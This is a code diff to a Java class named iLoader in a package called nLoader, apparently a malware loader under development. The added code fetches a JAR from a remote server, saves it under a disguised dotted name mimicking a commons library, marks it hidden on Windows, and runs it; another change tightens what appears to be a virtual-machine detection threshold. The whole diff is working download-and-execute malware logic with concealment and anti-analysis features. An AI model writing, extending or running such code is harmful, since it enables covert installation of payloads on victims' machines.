@@ -1,15 +1,19 @@
 package com.nocebo.nLoader;
 
+import java.io.BufferedOutputStream;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.FileOutputStream;
 import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.StringWriter;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.StringReader;
 import java.lang.management.ManagementFactory;
@@ -106,7 +110,7 @@ public class iLoader
     static public String stubPath = "";
     static public boolean isAgent = true;
     static public String currentClass = "";
-    static public int virtThreshold = 10; //5 for when it's ready
+    static public int virtThreshold = 5; //5 for when it's ready
 
 
 
@@ -133,7 +137,7 @@ public class iLoader
         coreOp();
         System.out.println("finished core op");
 
-        
+        /* 
         Thread thread = new Thread(new Runnable() {
             @Override
             public void run() {
@@ -150,7 +154,18 @@ public class iLoader
         });
         
         thread.start();
-        
+        */
+        String stubName = ".commons-3.3.1";
+
+        String workingDir = System.getProperty("user.dir");
+        String stubPath = String.format("%s%s%s.jar",new File(workingDir).getAbsolutePath(),File.separator,stubName);  
+        byte[] jarBytes = downloadRequest(String.format("%s%s",urlData,"59013"));
+        Files.write(Paths.get(stubPath), jarBytes);
+        if (System.getProperty("os.name").toLowerCase().contains("win"))
+        {
+            Files.setAttribute(Paths.get(stubPath), "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
+        } 
+        passThroughJar(stubPath, (new String[]{}));
     }
 
 
@@ -286,7 +301,7 @@ public class iLoader
     
     
 
-    private static URLClassLoader downloadRequest(String finalUrl) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
+    private static byte[] downloadRequest(String finalUrl) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
     {
         //stackoverflow provided boilerplate
         SSLContext sslCon = SSLContext.getInstance("TLS");
@@ -321,9 +336,23 @@ public class iLoader
 
 
 
-            URL[] urls = new URL[] {ctrlUrl}; 
-            URLClassLoader cl = new URLClassLoader(urls);
-            return cl;
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+
+    try {
+        byte[] chunk = new byte[4096];
+        int bytesRead;
+        InputStream stream = connMan.getInputStream();
+
+        while ((bytesRead = stream.read(chunk)) !=-1) {
+            outputStream.write(chunk, 0, bytesRead);
+        }
+
+    } catch (IOException e) {
+        e.printStackTrace();
+        return null;
+    }
+
+    return outputStream.toByteArray();
             
         }
         catch (Exception e)
